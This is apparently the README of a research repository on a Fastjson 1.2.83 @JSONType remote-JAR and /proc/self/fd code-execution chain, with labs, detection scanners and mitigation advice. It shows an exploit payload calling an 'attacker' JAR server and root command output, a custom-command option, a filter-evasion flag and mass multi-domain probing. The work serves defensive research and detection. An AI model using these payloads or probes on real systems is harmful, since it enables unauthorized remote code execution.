# Fastjson `@JSONType` remote-JAR/FD-chain lab and detection

This repository now preserves two distinct Fastjson research tracks:

- [`modern-fd/`](modern-fd/) is the recommended, **marker-only** reconstruction of
  the Fastjson **1.2.83** single-body remote-JAR/file-descriptor chain on Spring
  Boot 3, normal embedded Tomcat and JDK 17. It uses the literal fixed-DTO sink
  `JSON.parseObject(body, BoundEnvelope.class)` with AutoType disabled.
- The original top-level Docker Compose lab preserves the earlier JDK 8 direct
  remote-class route. It is command-capable and should be treated as a legacy,
  isolated proof rather than the modern-JDK method.
- [`scanner/`](scanner/) contains passive request/log detection, static artifact
  inventory and a non-executing reachability probe.

> The bug: `ParserConfig.checkAutoType` probes every `@type` value for the `@JSONType`
> annotation by doing `getResourceAsStream(typeName.replace('.','/') + ".class")`.
> On modern Linux/JDK combinations, a remote `jar:http` probe can leave the JAR
> cached behind an open descriptor; later `jar:file:/proc/self/fd/N` probes in the
> same body can reopen it under valid class names and initialize an annotated
> class. The exact 1.2.83 composition works with **AutoType disabled** and through
> a fixed DTO containing `List<Object>`. Binding alone is therefore not a
> mitigation. Full walk-through: [`docs/MECHANISM.md`](docs/MECHANISM.md).

## ⚠️ Authorized use only

This repository is for **education, defensive research, and authorized testing** of systems
you own or are explicitly permitted to test. Host publication, when supported for the
modern lab's internal network, is requested on `127.0.0.1` only; its scripts drive the
test entirely inside that isolated network. The modern lab has no process-execution
primitive and sets only a fixed in-JVM marker.
The legacy JDK 8 lab does execute `id` and writes its output to `/tmp/PWNED`; keep it
isolated. Do not point the legacy exploit or active probe at unauthorized systems.

## Scan your own environment

The [`scanner/`](scanner/) directory ships four **dependency-free Python 3** tools (no pip
installs).

- **`fjdetect.py`** — passively inspect decoded JSON request bodies or structured
  JSON logs for remote-JAR seeds and `/proc/self/fd` or `/dev/fd` sequences.
- **`fjscan_static.py`** — inventory jars/wars/ears for the vulnerable combination
  (content-backed, metadata-verified 1.2.83 × actual Spring Boot loader class
  content). Probe-bearing 1.2.48–1.2.82 releases and metadata/filename-only
  candidates are reported separately for review. CI-gate friendly (exit 2 on `EXPOSED`).
- **`fjscan_probe.py`** — active, **safe** reachability check: fires the `@type` at a canary
  you control (built-in listener **or** Burp Collaborator / interactsh) and correlates the
  resource-fetch callback. Its built-in listener returns an empty 404; configure
  external listeners equivalently. A callback does not prove class loading or RCE.
- **`fjpayload.py`** — generate remote-resource fetch bodies for manual testing;
  use only an empty/404 listener when execution is not intended.

```bash
# 1) passive request/log inspection
python3 scanner/fjdetect.py --ndjson gateway.jsonl

# 2) inventory build artifacts / unpacked images (parallel)
python3 scanner/fjscan_static.py /path/to/artifacts --threads 16

# 3) active probe across many domains — simplest: --auto fires baseline + plain + escaped comparison
#    DNS probes per target and prints a rollup; DNS callbacks land in your Burp Collaborator
python3 scanner/fjscan_probe.py --collaborator <sub>.oastify.com --auto --targets domains.txt --threads 50
cat domains.txt | python3 scanner/fjscan_probe.py --collaborator <sub>.oastify.com --auto --targets -

# 4) bulk fetch payloads for manual testing (one per domain, stable correlation token)
python3 scanner/fjpayload.py <collab-or-ip> --targets-file domains.txt
```

`domains.txt` = one target per line — a full `[METHOD ]URL` **or a bare domain**
(expanded with `--scheme` / `--target-port` / `--path`); `# ` comments allowed:
```
api.internal.example
POST https://svc.example/v1/ingest
10.0.0.7:8080
```

### Options

**`fjscan_probe.py`** (active probe)

| Flag | Default | Purpose |
|---|---|---|
| `--auto` | off | **simplest** — per target send baseline + plain + Unicode-escaped comparison DNS probe, print a rollup; just needs `--collaborator` + `--targets` |
| `--canary-ip <ip>` | — | built-in listener mode; IP of this host as targets see it |
| `--collaborator <v>` | — | external OOB (IPv4 / int / dot-free host / Collaborator subdomain) |
| `--probe-type <t>` | `jsontype` | manual mode: `jsontype` = remote-resource fetch path (`jar:http` int-IP); `dns` = `Inet4Address` OOB via a **dotted** host (**Collaborator-compatible**); `both` |
| `--targets <file\|->` | — | nonempty target list; `-` reads stdin (**required**); empty/comment-only input exits nonzero |
| `--threads N` | `20` | concurrent request workers |
| `--header 'K: V'` | — | extra request header (repeatable); a browser-like `--user-agent` is sent by default for a representative frontend request |
| `--baseline '{"a":1}'` | — | also send a benign control body per target; a baseline/probe response differential is consistent with content-sensitive edge, middleware, or application handling and needs corroboration |
| `--max-redirects N` | `3` | follow up to N exact-origin redirects or standard same-host HTTP:80→HTTPS:443 upgrades (0 = none); HTTPS downgrade, arbitrary port/origin changes, and cross-host redirects are blocked; upgrades retain only base non-secret headers |
| `--evasion {ukey,uval,both}` | `none` | `\uXXXX`-escape the `@type` key / class value (fastjson still decodes it); an evasion-only callback is consistent with decoded probe data passing a literal-keyword filter, but still requires parser/version corroboration |
| `--scheme` / `--target-port` / `--path` | `http` / — / `/parse` | how bare domains are expanded |
| `--method` | `POST` | default HTTP method |
| `--wrap '{"u":{{P}}}'` | `{{P}}` | nest the probe object inside a field |
| `--listen-port` / `--port` | `19000` / `80` | built-in canary port / collaborator port |
| `--wait` / `--timeout` | `10` / `8` | seconds to wait for callbacks / per-request timeout |

**`fjscan_static.py`** (inventory): `<paths…>` · `--threads N` (default `8`) · `--json`
(machine output; exit code `2` if any `EXPOSED`).

**`fjpayload.py`** (generator): `<collaborator>` · `--targets-file/-f <file\|->` (bulk) ·
`--port` · `--token` · `--wrap` · `--entry`.

> **Collaborator note:** the `@JSONType` `jar:` sink does `typeName.replace('.','/')`, so **every
> dot in the host becomes a slash** — a dotted Burp Collaborator subdomain (`abc.oastify.com`)
> can't be delivered through it (the tools fall back to an integer IP + URL path token). To get a
> callback into a **public Collaborator**, use **`--probe-type dns`**: the `java.net.Inet4Address`
> primitive accepts a dotted host and fires a DNS interaction (`<tok>.<sub>.oastify.com`),
> confirming the `Inet4Address` parse primitive + egress. That is prerequisite
> evidence, not proof of the remote-JAR/FD terminal. See
> [`scanner/README.md`](scanner/README.md).

## Marker-only modern-JDK lab (recommended)

**Requirements:** Docker + Docker Compose, and outbound access to Maven Central on the first
build (to fetch fastjson / spring-boot-loader / asm).

```bash
cd modern-fd
./scripts/static-safety-check.sh
./scripts/run-positive.sh
./scripts/run-controls.sh
```

The positive case sends one body to a normal embedded-Tomcat request thread. Its
literal sink is `final BoundEnvelope parsed = JSON.parseObject(body,
BoundEnvelope.class)`. Success is only the fixed property and log token
`FASTJSON_MODERN_FD_MARKER=fastjson-modern-fd-marker-v1`; the response still
returns a normally bound `BoundEnvelope`. The evidence directory contains the
request, response, container metadata, logs and SHA-256 manifest.

Controls cover ordinary JSON, FD candidates without a seed, a seed followed by
impossible descriptors, and SafeMode. See [`modern-fd/README.md`](modern-fd/README.md).

## Legacy JDK 8 direct-class lab

The original top-level Compose project remains available for reproducing the
older one-stage route. Unlike `modern-fd/`, it is command-capable and should be
run only in the isolated lab:

```bash
make up
make exploit
make down
```

Expected `make exploit` output:

```
[*] payload : {"@type":"jar:http:..attacker:8000.probe!.POC","x":1}
[*] response: {"ok":false,"error":"ClassCastException"}     <- RCE already fired, THEN the cast
[*] PROOF — command output captured inside the TARGET container (/tmp/PWNED):
------------------------------------------------------------------
uid=0(root) gid=0(root) groups=0(root)
RCE_via_fastjson_JSONType
------------------------------------------------------------------
```

The `ClassCastException` is the tell that binding is not a mitigation: the attacker class
runs its `<clinit>` during the `@type` probe, *before* fastjson tries to cast it to `Dto`.

### Legacy-lane variations

- **Direct-class lane only:** changing `target/Dockerfile` to JDK 17 blocks this
  legacy crafted-name definition and leaves a fetch. That result does **not** test
  or mitigate the separate `/proc/self/fd` continuation in `modern-fd/`.
- **Prove it's not autoType:** the target never calls `setAutoTypeSupport(true)` — check the
  banner at `http://127.0.0.1:8080/`.
- **Custom command:** `PWN_CMD='touch /tmp/i_was_here' docker compose up -d --build attacker`.

## Repository layout

| Path | What |
|---|---|
| `modern-fd/` | marker-only Boot 3/JDK 17 fixed-DTO FD-chain lab and decisive controls |
| `scanner/` | passive payload/log detection, static inventory and non-executing reachability tools |
| `target/` | legacy JDK 8 target using `JSON.parseObject(body, Dto.class)` under a manually selected Boot loader |
| `attacker/` | legacy command-capable JDK 8 class generator and JAR server |
| `exploit/` | legacy `exploit.sh` proof |
| `docs/MECHANISM.md` | annotated source walk-through |

## Mitigation

Enable `-Dfastjson.parser.safeMode=true` on the ordinary handler-free path and
audit installed `AutoTypeCheckHandler`s; restrict JVM egress; migrate untrusted
parsing away from Fastjson 1.x; alert on decoded `@type` remote-JAR seeds and
dense `/proc/self/fd` or `/dev/fd` sequences. DTO binding and JDK 9+ are not
complete mitigations for the modern composition.

## Credits & references

- **Original disclosure:** Kirill Firsov (**@k_firsov**, FearsOff) — public claim of a
  gadget-free RCE in fastjson 1.2.83 (July 2026).
- **Public proof-of-concept & the `@JSONType` / jar-URL-internal-name technique:**
  **@wouijvziqy** — <https://github.com/wouijvziqy/Fastjson-JsonType-RCE-PoC>.
  `attacker/Gen.java` re-implements that technique for this lab.
- **Modern-JDK FD-chain reports:** the
  [WeChat article](https://mp.weixin.qq.com/s/ngrBwRPtFzM4G3A_P9SCog) and the earlier
  [detailed Cnyes report](https://m.cnyes.com/news/id/6540815) supplied the
  retained-JAR `/proc/self/fd` hypothesis. They were treated as external reports,
  not as independent runtime proof.
- **Public Linux FD implementation:**
  [DmTomHL/fastjson-1.2.83-gadget-rce](https://github.com/DmTomHL/fastjson-1.2.83-gadget-rce)
  narrowed the reconstruction gap. Its command-capable code was reviewed
  statically and was not executed; `modern-fd/` uses independently authored
  marker-only classes and a normal fixed-DTO Tomcat endpoint.
- fastjson — <https://github.com/alibaba/fastjson> (see also `safeMode`, and the autoType
  history behind CVE-2022-25845).

This lab and the `scanner/` tooling package those findings into a reproducible testbed and
defensive checks. Not affiliated with or endorsed by the researchers above.
